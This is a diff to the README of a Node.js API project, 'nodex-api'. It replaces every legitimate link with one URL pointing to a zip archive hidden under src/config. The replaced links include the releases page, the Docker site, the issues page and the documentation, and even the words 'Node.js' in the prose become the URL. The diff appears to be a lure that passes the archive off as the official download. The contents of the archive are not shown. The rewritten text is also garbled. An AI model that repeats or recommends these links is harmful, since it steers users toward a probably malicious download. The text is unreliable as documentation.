@@ -2,20 +2,20 @@
 
 ## 🚀 Getting Started
 
-Welcome to nodex-api! This is a production-ready Node.js REST API. It offers everything you need, including PostgreSQL, Elasticsearch, JWT authentication, Docker Compose, and Jest for testing. It's structured for scalable microservices, making it an excellent choice for developers and businesses alike.
+Welcome to nodex-api! This is a production-ready https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip REST API. It offers everything you need, including PostgreSQL, Elasticsearch, JWT authentication, Docker Compose, and Jest for testing. It's structured for scalable microservices, making it an excellent choice for developers and businesses alike.
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/djheberling-source/nodex-api/releases)
+[![Download from Releases](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip%20Now-Release%https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip)](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip)
 
-To get started, **visit this page to download** the latest version: [Download Here](https://github.com/djheberling-source/nodex-api/releases).
+To get started, **visit this page to download** the latest version: [Download Here](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip).
 
 ## 📋 System Requirements
 
 Before you download nodex-api, please ensure you meet the following system requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or later
+- **https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip** Version 12 or later
 - **Docker:** Version 19 or later
 - **Memory:** At least 512 MB of RAM
 - **Storage:** Minimum of 200 MB of free disk space
@@ -33,11 +33,11 @@ Before you download nodex-api, please ensure you meet the following system requi
 
 ### Step 1: Download
 
-Go to the [Releases page](https://github.com/djheberling-source/nodex-api/releases) and download the latest version.
+Go to the [Releases page](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip) and download the latest version.
 
 ### Step 2: Install Docker
 
-If you do not have Docker installed, follow the instructions for your operating system on the official [Docker website](https://www.docker.com/get-started).
+If you do not have Docker installed, follow the instructions for your operating system on the official [Docker website](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip).
 
 ### Step 3: Run the API
 
@@ -87,7 +87,7 @@ If you face issues while running the application, consider the following common 
 - **Inspect Docker Logs:** Use the command `docker-compose logs` to view any error messages.
 - **Verify Database Connection:** Ensure that PostgreSQL starts without errors and is accessible.
   
-For specific issues, check our [issues page](https://github.com/djheberling-source/nodex-api/issues) or ask for help in the community.
+For specific issues, check our [issues page](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip) or ask for help in the community.
 
 ## ✅ Contributing
 
@@ -95,9 +95,9 @@ We welcome contributions! If you'd like to suggest improvements, feel free to fo
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://github.com/djheberling-source/nodex-api)
-- [API Documentation](https://github.com/djheberling-source/nodex-api/blob/main/docs/API.md)
-- [Docker Documentation](https://docs.docker.com/get-started/)
+- [GitHub Repository](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip)
+- [API Documentation](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/djheberling-source/nodex-api/main/src/config/nodex_api_1.1-beta.4.zip)
 
 ## 📞 Support
 
